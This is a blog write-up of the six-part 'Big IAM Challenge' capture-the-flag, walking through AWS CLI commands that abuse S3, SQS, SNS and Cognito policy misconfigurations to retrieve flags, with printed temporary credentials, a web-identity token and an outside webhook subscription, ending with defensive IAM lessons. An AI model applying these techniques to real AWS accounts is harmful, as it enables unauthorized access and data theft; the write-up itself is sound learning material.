---
authors:
  - hatedabamboo
date:
  created: 2025-05-10
slug: the-big-iam-challenge
tags:
  - aws
  - ctf
  - iam
categories:
  - "⬢⬢⬢ Advanced"
title: "Solving The Big IAM Challenge"
---
CTF (Capture The Flag) challenges are a fun and safe way to stretch a stale grain muscle and learn a trick or two about how robust security is not actually that robust. Today we're going to solve [The Big IAM Challenge](https://thebigiamchallenge.com/) and reflect on the lessons learned. 

<!-- more -->

![image](../assets/solving-the-big-iam-challenge.webp)

# Intro

The Big IAM Challenge consists of 6 challenges, each based on a task and an IAM policy. We also have an access to a web CLI. With these tools we will have to find our way to a flag -- a string with the key that will allow us to progress to the next challenge and, eventually, solve them all.

## Challenge 1: Buckets of Fun

!!! quote "Task"

    We all know that public buckets are risky. But can you find the flag?


```json title="IAM policy"
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::thebigiamchallenge-storage-9979f4b/*"
        },
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:ListBucket",
            "Resource": "arn:aws:s3:::thebigiamchallenge-storage-9979f4b",
            "Condition": {
                "StringLike": {
                    "s3:prefix": "files/*"
                }
            }
        }
    ]
}
```

From the existing policy we can conclude, that we have access to a certain bucket. We can get all the objects from this bucket, but can list only `files/` directory inside it. Let's do that.

```shell
> aws s3 ls thebigiamchallenge-storage-9979f4b/files/
2023-06-05 19:13:53         37 flag1.txt
2023-06-08 19:18:24      81889 logo.png
```

And there's our flag. If we try to download it, we will encounter an error that the filesystem is read-only. Which makes sense, but is an obstacle for us. However, we can overcome this issue by copying the file to stdin and printing it to the console:

```shell
> aws s3 cp s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt - | cat
{wiz:exposed-storage-risky-as-usual}
```

With this flag challenge 1 is complete.

## Challenge 2: ~~Google~~ Analytics

!!! quote "Task"

    We created our own analytics system specifically for this challenge. We think it's so good that we even used it on this page. What could go wrong?

    Join our queue and get the secret flag.


```json title="IAM policy"
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": [
                "sqs:SendMessage",
                "sqs:ReceiveMessage"
            ],
            "Resource": "arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2"
        }
    ]
}
```

This is the task I can stand behind, fuck Google's privacywashing, lust for private data and maximizing profits.

From this policy we can conclude that we're meant to receive a message from the queue. Let's use `awscli` for that purpose.

```shell
> aws sqs receive-message

aws: error: the following arguments are required: --queue-url
```

To read a message from the queue we need a queue URL, but we have only an ARN. That's not a problem, we can compile one ourselves. URLs for the queues have the following format: `https://sqs.{region}.amazonaws.com/{accouunt}/{queue_name}`.

```shell
> aws sqs receive-message --queue-url https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2
{
    "Messages": [
        {
            ...
            "Body": "{\"URL\": \"https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html\", \"User-Agent\": \"Lynx/2.5329.3258dev.35046 libwww-FM/2.14 SSL-MM/1.4.3714\", \"IsAdmin\": true}"
        }
    ]
}
```

No flag here, but we have a URL pointing to a file in a bucket. Let's check that file.

```shell
> curl https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html
{wiz:you-are-at-the-front-of-the-queue}
```

Bingo! There's our flag and completed challenge.

## Challnge 3: Enable Push Notifications

!!! quote "Task"

    We got a message for you. Can you get it?

```json title="IAM policy"
{
    "Version": "2008-10-17",
    "Id": "Statement1",
    "Statement": [
        {
            "Sid": "Statement1",
            "Effect": "Allow",
            "Principal": {
                "AWS": "*"
            },
            "Action": "SNS:Subscribe",
            "Resource": "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",
            "Condition": {
                "StringLike": {
                    "sns:Endpoint": "*@tbic.wiz.io"
                }
            }
        }
    ]
}
```

The policy clearly wants us to subscribe to this SNS topic. I'd be happy to oblige! Since we have a wildcard (`*`) before `@tbic.wiz.io`, it means we can use any email!

```shell
> aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol email --notification-endpoint hello@tbic.wiz.io
{
    "SubscriptionArn": "pending confirmation"
}
```

And now we wait.

Wait, what? Wait for what? How do I confirm the subscription to the topic if I have no access to the email? Looks like I fell in the easiest trap!

Okay, let's think. Since we have no access to email, we have to figure out a different way to receive a message from the topic. How can we do that? What are the options to receive messages from SNS? We're able to use the following protocols to communicate with SNS: http, https, email, email-json, sms, sqs, application, lambda and firehose. What if we set up an HTTP endpoint to receive messages? Webhooks, here we go! Luckily there are [services](https://webhook.site) online that allow one to test webhook requests. The trick here is to take the unique webhook URL and add the required endpoint string to the end of the URL: `https://webhook.site/3bddcb48-f58d-4284-a731-491c8784e0b1@tbic.wiz.io`. Still a valid URL? Let's find out!

```shell
> aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol https --notification-endpoint https://webhook.site/3bddcb48-f58d-4284-a731-491c8784e0b1/@tbic.wiz.io
{
    "SubscriptionArn": "pending confirmation"
}
```

In couple seconds we receive a message with the configuration URL. Copy and paste it into the browser to confirm the subscription. And after several more seconds in the following message on a webhooks site interface we see a new message with the flag itself!

```json
{
  ...
  "Message": "{wiz:always-suspect-asterisks}",
  ...
}
```

Third challenge is done, way to go!

## Challenge 4: Admin only?

!!! quote "Task"

    We learned from our mistakes from the past. Now our bucket only allows access to one specific admin user. Or does it?

```json title="IAM policy"
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321/*"
        },
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:ListBucket",
            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321",
            "Condition": {
                "StringLike": {
                    "s3:prefix": "files/*"
                },
                "ForAllValues:StringLike": {
                    "aws:PrincipalArn": "arn:aws:iam::133713371337:user/admin"
                }
            }
        }
    ]
}
```

The provided IAM policy clearly states that list files in a bucket can only a user with the `admin` role. However, there's also a hole: anyone can download files from the bucket. This is a very bad practice and a huge security risk. From these statements we can conclude that the bucket has at least `files/` directoy, and we can view it by accessing HTTP endpoint of the bucket.

```shell
> curl "https://s3.amazonaws.com/thebigiamchallenge-admin-storage-abf1321?prefix=files/"
<?xml version="1.0" encoding="UTF-8"?>
<ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/"><Name>thebigiamchallenge-admin-storage-abf1321</Name><Prefix>files/</Prefix><Marker></Marker><MaxKeys>1000</MaxKeys><IsTruncated>false</IsTruncated><Contents><Key>files/flag-as-admin.txt</Key><LastModified>2023-06-07T19:15:43.000Z</LastModified><ETag>"e365cfa7365164c05d7a9c209c4d8514"</ETag><Size>42</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>files/logo-admin.png</Key><LastModified>2023-06-08T19:20:01.000Z</LastModified><ETag>"c57e95e6d6c138818bf38daac6216356"</ETag><Size>81889</Size><StorageClass>STANDARD</StorageClass></Contents></ListBucketResult>
```

He-he, there it is. Here they are the droinds I'm looking for!

```shell
> aws s3 cp s3://thebigiamchallenge-admin-storage-abf1321/files/flag-as-admin.txt - | cat
{wiz:principal-arn-is-not-what-you-think}
```

Challenge 4 is complete.

## Challenge 5: Do I know you?

!!! quote "Task"

    We configured AWS Cognito as our main identity provider. Let's hope we didn't make any mistakes.

```json title="IAM policy"
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "VisualEditor0",
            "Effect": "Allow",
            "Action": [
                "mobileanalytics:PutEvents",
                "cognito-sync:*"
            ],
            "Resource": "*"
        },
        {
            "Sid": "VisualEditor1",
            "Effect": "Allow",
            "Action": [
                "s3:GetObject",
                "s3:ListBucket"
            ],
            "Resource": [
                "arn:aws:s3:::wiz-privatefiles",
                "arn:aws:s3:::wiz-privatefiles/*"
            ]
        }
    ]
}
```

Okay, let's dissect what do we have here. First things first, `cognito-sync:*` is our way to the contents of the bucket mentioned in the second statement of the policy. I feel like `mobileanalytics:PutEvents` is a bit misleading here and may not prove useful, but we'll see. There's also a picture of AWS Cognito in this task, which is unusual. Perhaps it's also a clue? Let's inspect the code.

```html
<img style="width: 16rem" id="signedImg" class="mx-auto mt-4" src="#" alt="Signed img from S3" />
<script src="https://sdk.amazonaws.com/js/aws-sdk-2.719.0.min.js"></script>
<script>
  AWS.config.region = 'us-east-1';
  AWS.config.credentials = new AWS.CognitoIdentityCredentials({IdentityPoolId: "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"});
  // Set the region
  AWS.config.update({region: 'us-east-1'});

  $(document).ready(function() {
    var s3 = new AWS.S3();
    params = {
      Bucket: 'wiz-privatefiles',
      Key: 'cognito1.png',
      Expires: 60 * 60
    }

    signedUrl = s3.getSignedUrl('getObject', params, function (err, url) {
      $('#signedImg').attr('src', url);
    });
});
</script>
```

Yep, there it is. A very helpfully placed Cognito Identity Pool ID. Let's use it to obtain our ID:

```shell
> aws cognito-identity get-id --identity-pool-id us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b
{
    "IdentityId": "us-east-1:157d6171-eee2-cf0f-f29f-f684025c7f2c"
}
```

And with this ID we are able to obtain credentials to assume!

```shell
> aws cognito-identity get-credentials-for-identity --identity-id us-east-1:157d6171-eee2-cf0f-f29f-f684025c7f2c
{
    "IdentityId": "us-east-1:157d6171-eee2-cf0f-f29f-f684025c7f2c",
    "Credentials": {
        "AccessKeyId": "ASIARK7LBOHXHAHYXG4C",
        "SecretKey": "i1sxDh5obFEGzMpIw3s+nGgPfnuD3vdDjlqhMakW",
        "SessionToken": "IQoJb3JpZ2luX2VjEPz//////////wEaCXVzLWVhc3QtMSJGMEQCIE086qWoZ18m8+iEw11NGcawCIbwmxfXZXjaZbYNgBaRAiB3OJLgI1X5v72NTDiOfcwDnZOMGwNO2ZtMte9Ff1fSIiq7BQil//
////////8BEAAaDDA5MjI5Nzg1MTM3NCIMq3db2mZPg5GWhCfGKo8F8o8rTZPXKSTgtByx2JcB93zlqEEJw2zWzF61O6App4FMY8Jrhh9YAbTDR4meOt32FOnPiDKEG5Tko6rmeRwunwxFVXtEIrg1TVhaTLVuyViePLOXJYnrwIpRN7U1WlQSYIx3lRuXIEG5Gm48H51iaz+YBhcYO8CHpidqQBnBAyoMmFaZK/liuokGjufsmj9Rc6/kInC/F+gat7fyycHICZbYHzYgpSagP44NVNqTlMqW8dWZeBN04X05MEHxeZuP7LNNmEIuiCEBFTyxtDQTweK5nfySFXJUK8EWjdehgGzP3lPZIdbRadXrXVjgSbRK9CZtYIiCoKsiIhyJ+pGoY+U41y03nHbQVsAGyadEMWqxyO48ij5aCsl9Q8Sn8VPmzUGYb02WqT8TpMmPmGpxzb1SrMXpBcI9yfmT0afS7HeGIcbtrNdGx+pPZEBEfwAutGFjgRm2IgkH5pCwfWQT1/9vlAGeYSxPg+4vHyd/e/lSRptaGSlVqBZR+ayMUTxDYnCu8PR3BNHhf+RHs2GNCc8V5e+rFpmy2dpoFAaW90OMJn56V0m41FtU1UGqB26Ma8eWKgvtokHAK6OIxyZqvN7u24NKkp9u7EvZ44VX1ztU4eHNNK/fpoVWzeS48t9XImM6ImebAMVV/9HOyYVSRUoV5+vsLlAbYt2yDW82DPAd6wOELBez9XsP3NDwK4gPA13SX/7lx0MqsToWihcVXpPE891wVwouyAQj4oJy2QzocD88saqcJLnlDmUJeXsROAdDdpOl0RyG73xmxjOeycF2ebBfccaMW9sfbCj+v9vwQXlccB+Y1E6yy7rv4m5WVqZZiWkR69sk6ugyONSP5UAHdcwT+lUIudYibF5PcDCW8vzABjrdAkXktLCIeiuItjYDiKf93U9aSD9E539EfMuyaNIkL838BFEwYQneudtHjWUZ3MNZNNr7gTVmkZpjP5tvYkzYP42FLkdP0lU4uhnY7+wb1X1MhLz5g2Ff0HM1vQi+s63a1ow5zb+njOoZ2NDcMM3qpn4u8tyHK1Sw1IJPYLGLfk7OtkI3wVl3rhUIeObVMDWC7Q72xaqeSkPnjqAwXGmVVpxhmqha5FC4XInhwOUtPMhL5iFla6ZLA1lD1edv/ZD9ger1dppUUK7wXonpX+pIhv9IXWIt0JSzQRaju9Cy4Ou6m6Fs4LqHyk/cnGZb+4lslVgPotKf5LeHqKMMO0UOCvtw7KQoGlg7EDwTUMhy8uIwsCMZXTnJNoPaN526s10V6OlwYLc3MBO97dZbfmvZ4juFsgNdDrbCbNHVWHxUyms+elD/KvbrM47aXX2r1IGPexDvtmSwqwCBvVv7WPw=",
        "Expiration": 1746880294.0
    }
}
```

I can't help but enjoy this amazing loophole left for us to find. Damn I love these challenges.

With the help of the provded credentials we will be able to assume a role. However, we won't be able to do that in the web CLI on a challenges page -- we will have to use our own terminal.

```shell
$ export AWS_ACCESS_KEY_ID=ASIARK7LBOHXHAHYXG4C
$ export AWS_SECRET_ACCESS_KEY=i1sxDh5obFEGzMpIw3s+nGgPfnuD3vdDjlqhMakW
$ export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEPz//////////wEaCXVzLWVhc3QtMSJGMEQCIE086qWoZ18m8+iEw11NGcawCIbwmxfXZXjaZbYNgBaRAiB3OJLgI1X5v72NTDiOfcwDnZOMGwNO2ZtMte9Ff1fSIiq7BQil//////////8BEAAaDDA5MjI5Nzg1MTM3NCIMq3db2mZPg5GWhCfGKo8F8o8rTZPXKSTgtByx2JcB93zlqEEJw2zWzF61O6App4FMY8Jrhh9YAbTDR4meOt32FOnPiDKEG5Tko6rmeRwunwxFVXtEIrg1TVhaTLVuyViePLOXJYnrwIpRN7U1WlQSYIx3lRuXIEG5Gm48H51iaz+YBhcYO8CHpidqQBnBAyoMmFaZK/liuokGjufsmj9Rc6/kInC/F+gat7fyycHICZbYHzYgpSagP44NVNqTlMqW8dWZeBN04X05MEHxeZuP7LNNmEIuiCEBFTyxtDQTweK5nfySFXJUK8EWjdehgGzP3lPZIdbRadXrXVjgSbRK9CZtYIiCoKsiIhyJ+pGoY+U41y03nHbQVsAGyadEMWqxyO48ij5aCsl9Q8Sn8VPmzUGYb02WqT8TpMmPmGpxzb1SrMXpBcI9yfmT0afS7HeGIcbtrNdGx+pPZEBEfwAutGFjgRm2IgkH5pCwfWQT1/9vlAGeYSxPg+4vHyd/e/lSRptaGSlVqBZR+ayMUTxDYnCu8PR3BNHhf+RHs2GNCc8V5e+rFpmy2dpoFAaW90OMJn56V0m41FtU1UGqB26Ma8eWKgvtokHAK6OIxyZqvN7u24NKkp9u7EvZ44VX1ztU4eHNNK/fpoVWzeS48t9XImM6ImebAMVV/9HOyYVSRUoV5+vsLlAbYt2yDW82DPAd6wOELBez9XsP3NDwK4gPA13SX/7lx0MqsToWihcVXpPE891wVwouyAQj4oJy2QzocD88saqcJLnlDmUJeXsROAdDdpOl0RyG73xmxjOeycF2ebBfccaMW9sfbCj+v9vwQXlccB+Y1E6yy7rv4m5WVqZZiWkR69sk6ugyONSP5UAHdcwT+lUIudYibF5PcDCW8vzABjrdAkXktLCIeiuItjYDiKf93U9aSD9E539EfMuyaNIkL838BFEwYQneudtHjWUZ3MNZNNr7gTVmkZpjP5tvYkzYP42FLkdP0lU4uhnY7+wb1X1MhLz5g2Ff0HM1vQi+s63a1ow5zb+njOoZ2NDcMM3qpn4u8tyHK1Sw1IJPYLGLfk7OtkI3wVl3rhUIeObVMDWC7Q72xaqeSkPnjqAwXGmVVpxhmqha5FC4XInhwOUtPMhL5iFla6ZLA1lD1edv/ZD9ger1dppUUK7wXonpX+pIhv9IXWIt0JSzQRaju9Cy4Ou6m6Fs4LqHyk/cnGZb+4lslVgPotKf5LeHqKMMO0UOCvtw7KQoGlg7EDwTUMhy8uIwsCMZXTnJNoPaN526s10V6OlwYLc3MBO97dZbfmvZ4juFsgNdDrbCbNHVWHxUyms+elD/KvbrM47aXX2r1IGPexDvtmSwqwCBvVv7WPw=
$ aws sts get-caller-identity
{
    "UserId": "AROARK7LBOHXJKAIRDRIU:CognitoIdentityCredentials",
    "Account": "092297851374",
    "Arn": "arn:aws:sts::092297851374:assumed-role/Cognito_s3accessUnauth_Role/CognitoIdentityCredentials"
}
$ aws s3 ls s3://wiz-privatefiles/
2023-06-05 21:42:27       4220 cognito1.png
2023-06-05 15:28:35         37 flag1.txt
$ aws s3 cp s3://wiz-privatefiles/flag1.txt - | cat
{wiz:incognito-is-always-suspicious}
```

Oh boy I can't agree more. A very fun and very interesting challenge done. Let's finish the final one!

## Challenge 6: One final push

!!! quote "Task"

    Anonymous access no more. Let's see what can you do now.

    Now try it with the authenticated role: arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role

```json title="IAM policy"
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "Federated": "cognito-identity.amazonaws.com"
            },
            "Action": "sts:AssumeRoleWithWebIdentity",
            "Condition": {
                "StringEquals": {
                    "cognito-identity.amazonaws.com:aud": "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
                }
            }
        }
    ]
}
```

Provided AWS policy is like telling us: hey, there's a quite specific action that you can use! And use it we will. Same as before, using the Identity Pool ID we will obtain our Identity ID.

```shell
> aws cognito-identity get-id --identity-pool-id us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b
{
    "IdentityId": "us-east-1:157d6171-eea6-c0da-14bd-11c12678c1a8"
}
```

With the Identity ID we are able now to get an OpenID token, since we can't just assume any role with STS and we have to use web identity. Hence, OpenID token.

```shell
> aws cognito-identity get-open-id-token --identity-id us-east-1:157d6171-eea6-c0da-14bd-11c12678c1a8
{
    "IdentityId": "us-east-1:157d6171-eea6-c0da-14bd-11c12678c1a8",
    "Token": "eyJraWQiOiJ1cy1lYXN0LTEtNyIsInR5cCI6IkpXUyIsImFsZyI6IlJTNTEyIn0.eyJzdWIiOiJ1cy1lYXN0LTE6MTU3ZDYxNzEtZWVhNi1jMGRhLTE0YmQtMTFjMTI2NzhjMWE4IiwiYXVkIjoidXMtZWFzdC0xOmI3M2NiMmQyLTBkMDAtNGU3Ny04ZTgwLWY5OWQ5YzEzZGEzYiIsImFtciI6WyJ1bmF1dGhlbnRpY2F0ZWQiXSwiaXNzIjoiaHR0cHM6Ly9jb2duaXRvLWlkZW50aXR5LmFtYXpvbmF3cy5jb20iLCJleHAiOjE3NDY4Nzg0NTksImlhdCI6MTc0Njg3Nzg1OX0.jLAQFCKrh5uYs-FO89P8LTmHsNRaySNWAhCDNE4N5PxSUu3AuduCbuYUVXrCcvflUPhJvePb2cTk2cM1K431ZtKqP1gWJ8XL0BW6M_JO2jHXftuWnTHeqvDuca36uTAOMJ5Vk62Fm_2OSgeWoLGgqT4WolhuRZa4nn0evuKtuHK1omEKnPsymKhUsqHw45mCdZ177XT5QCry2eiOielY3niTt7x137j_E739eP6x0tbXFMgpHTvxKFIkaQOhBn0A-1tDjZ5WlQeT5qbioOaAVK5xAjAfJeQOpZ8AZPr-H0aC9OCCN-_zNGgil31DAzFTWhAtjYevvdN9RkaIsW_PdQ"
}
```

And now with this nice JWT (JSON web token) we would be able to assume the role the challenge is telling us to assume.

```shell
$ aws sts assume-role-with-web-identity --web-identity-token eyJraWQiOiJ1cy1lYXN0LTEtNyIsInR5cCI6IkpXUyIsImFsZyI6IlJTNTEyIn0.eyJzdWIiOiJ1cy1lYXN0LTE6MTU3ZDYxNzEtZWVhNi1jMGRhLTE0YmQtMTFjMTI2NzhjMWE4IiwiYXVkIjoidXMtZWFzdC0xOmI3M
2NiMmQyLTBkMDAtNGU3Ny04ZTgwLWY5OWQ5YzEzZGEzYiIsImFtciI6WyJ1bmF1dGhlbnRpY2F0ZWQiXSwiaXNzIjoiaHR0cHM6Ly9jb2duaXRvLWlkZW50aXR5LmFtYXpvbmF3cy5jb20iLCJleHAiOjE3NDY4Nzg0NTksImlhdCI6MTc0Njg3Nzg1OX0.jLAQFCKrh5uYs-FO89P8LTmHsNRaySNWAhCDNE4N5PxSUu3A
uduCbuYUVXrCcvflUPhJvePb2cTk2cM1K431ZtKqP1gWJ8XL0BW6M_JO2jHXftuWnTHeqvDuca36uTAOMJ5Vk62Fm_2OSgeWoLGgqT4WolhuRZa4nn0evuKtuHK1omEKnPsymKhUsqHw45mCdZ177XT5QCry2eiOielY3niTt7x137j_E739eP6x0tbXFMgpHTvxKFIkaQOhBn0A-1tDjZ5WlQeT5qbioOaAVK5xAjAfJeQ
OpZ8AZPr-H0aC9OCCN-_zNGgil31DAzFTWhAtjYevvdN9RkaIsW_PdQ --role-arn arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role --role-session-name HelloThere
{
    "Credentials": {
        "AccessKeyId": "ASIARK7LBOHXPDT2U3BW",
        "SecretAccessKey": "CiOKsQIiMBxy3Hav5bQ230c13pycH6vrqmcVp14s",
        "SessionToken": "FwoGZXIvYXdzEA0aDJQmv03JEKnQKp8OwCKiAk5V5ehu5IvKBGyZTVERUCaEwt8iHA7bTp2RYKfl0JNwJCxVA0bNDccjD1skSmwmfwb2H67nrKnOsj8zHrJuVXZf32XPfMni+k9tZZaw/i+18JYaZiFA/5ytPcTVg0aVQN9EpcOOvKBrWGytoya0AA3ynJTgDHAGWSljN+oIjoJQa4/ProQFye5e1Kfs6Ueh2Q31KWtBb5U4sEUlUZGTmNdoM4Zy2L9WUNjNzbpBoi2U9NhTWzORFcVRO2Y3d9p+FoqzAZIlKSyaN5cY0RTkNZYizpHgehgdrRPphU/mVjHlPhWkOn8MjT44ajwS8SJ7Tn9KqnMzBkuXa54vpm4EptngDuTVt5Z50QVZ72qCxRkz38jeTfGOe4zRPXCRXfM9oUkeKOT8/MAGMpYBjbShpAGWcCSp4q6/iJEZRRXcYOD71POGmAR1FTZkUnofAYIc/Yl4/ptWnJK1uc9nfJnUUd49yR1oSsrZGb+HtH5o1ZCql6iT7OPiYogeAbX97tbqq4nxM0qQ679+m61vpmQWvFgm//JHfN8iOGLPAZtB19zE2BzBl+sV20oedFd47J8JtbN4e1FJUGQSiYO5YiolhHuP",
        "Expiration": "2025-05-10T12:54:12+00:00"
    },
    "SubjectFromWebIdentityToken": "us-east-1:157d6171-eea6-c0da-14bd-11c12678c1a8",
    "AssumedRoleUser": {
        "AssumedRoleId": "AROARK7LBOHXASFTNOIZG:HelloThere",
        "Arn": "arn:aws:sts::092297851374:assumed-role/Cognito_s3accessAuth_Role/HelloThere"
    },
    "Provider": "cognito-identity.amazonaws.com",
    "Audience": "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
}
$ export AWS_ACCESS_KEY_ID=ASIARK7LBOHXPDT2U3BW
$ export AWS_SECRET_ACCESS_KEY=CiOKsQIiMBxy3Hav5bQ230c13pycH6vrqmcVp14s
$ export AWS_SESSION_TOKEN=FwoGZXIvYXdzEA0aDJQmv03JEKnQKp8OwCKiAk5V5ehu5IvKBGyZTVERUCaEwt8iHA7bTp2RYKfl0JNwJCxVA0bNDccjD1skSmwmfwb2H67nrKnOsj8zHrJuVXZf32XPfMni+k9tZZaw/i+18JYaZiFA/5ytPcTVg0aVQN9EpcOOvKBrWGytoya0AA3ynJTgDHAGWSljN+oIjoJQa4/ProQFye5e1Kfs6Ueh2Q31KWtBb5U4sEUlUZGTmNdoM4Zy2L9WUNjNzbpBoi2U9NhTWzORFcVRO2Y3d9p+FoqzAZIlKSyaN5cY0RTkNZYizpHgehgdrRPphU/mVjHlPhWkOn8MjT44ajwS8SJ7Tn9KqnMzBkuXa54vpm4EptngDuTVt5Z50QVZ72qCxRkz38jeTfGOe4zRPXCRXfM9oUkeKOT8/MAGMpYBjbShpAGWcCSp4q6/iJEZRRXcYOD71POGmAR1FTZkUnofAYIc/Yl4/ptWnJK1uc9nfJnUUd49yR1oSsrZGb+HtH5o1ZCql6iT7OPiYogeAbX97tbqq4nxM0qQ679+m61vpmQWvFgm//JHfN8iOGLPAZtB19zE2BzBl+sV20oedFd47J8JtbN4e1FJUGQSiYO5YiolhHuP
$ aws sts get-caller-identity
{
    "UserId": "AROARK7LBOHXASFTNOIZG:HelloThere",
    "Account": "092297851374",
    "Arn": "arn:aws:sts::092297851374:assumed-role/Cognito_s3accessAuth_Role/HelloThere"
}
$ aws s3 ls
2024-06-06 08:21:35 challenge-website-storage-1fa5073
2024-06-06 10:25:59 payments-system-cd6e4ba
2023-06-04 19:07:29 tbic-wiz-analytics-bucket-b44867f
2023-06-05 15:07:44 thebigiamchallenge-admin-storage-abf1321
2023-06-04 18:31:02 thebigiamchallenge-storage-9979f4b
2023-06-05 15:28:31 wiz-privatefiles
2023-06-05 15:28:31 wiz-privatefiles-x1000
$ aws s3 ls s3://wiz-privatefiles-x1000
2023-06-05 21:42:27       4220 cognito2.png
2023-06-05 15:28:35         40 flag2.txt
$ aws s3 cp s3://wiz-privatefiles-x1000/flag2.txt - | cat
{wiz:open-sesame-or-shell-i-say-openid}
```

And this is it. The final challenge is done. Congratulations!

## Post Mortem

I had a great time solving these challenges (unless I didn't). They were fun, but at the same time complex and not straightforward.

Truth to be told, some scenarios I was able to solve only with the help of guides from the internet. Only writing this article I noticed that image in the challenge #5 is actually a clue and not a random picture. Because of this oversight I had no idea where to look for the Identity Pool ID, so I had to google for a clue. Turns out it was right there all the time -- I just wasn't bright enough to connect the dots.

But fun aside, all of these challenges represent possible ways an attacker can extract helpful tips even from the most innocent pieces of information -- IAM policies in our case. For example, leaving `*` in `Principal` field allows any actor to subscribe to our queue. And I mean *any* -- unintended as well.

Another interesting example of possible loopholes is limiting allowed action only to `s3:GetObject` for all the actors. It sounds quite safe, right? How can you get a file you don't know the name or the location of? Turns out, there are ways, thanks to the HTTP endpoints and `?prefix=` parameter.

And my favourite example of how a malicious actor can follow the breadcrumbs is the leftover of a single ID -- and how it can lead to a full-scale breach of a secured perimeter and compromising the sensitive data.

Learning best practices how to keep your AWS infrastructure in theory is one thing. Actually seeing the ways even the tiniest misconfigurations can lead to a disaster -- totally another. And I love it.

Finally, to address an elephant in the room, let's wrap this article with the most important statements regarding AWS IAM policies:

- Always specify access to certain actions to specific resources and to dedicated principals: never leave wildcard permissions anywhere.
- Separate open perimeter and closed perimeter of your infrastructure and restrics access only to assigned people.
- Create alerts to notify when a user from a certain group is trying to perform an unusual action -- and tries that repeatedly.
- Prioritize temprorary credentials assignment instead of perpetual access keys. Access keys should only be used by automated workflows (even this is a bad practice) and rotated regularly. Luckily, automation doesn't complain if you're asking it to change password every month.

Stay safe.

---

<p style="text-align: center;">
<a href="mailto:reply@hatedabamboo.me?subject=Reply%20to%3A%20Solving%20The%20Big%20IAM%20Challenge">Reply to this post ✉️</a>
</p>
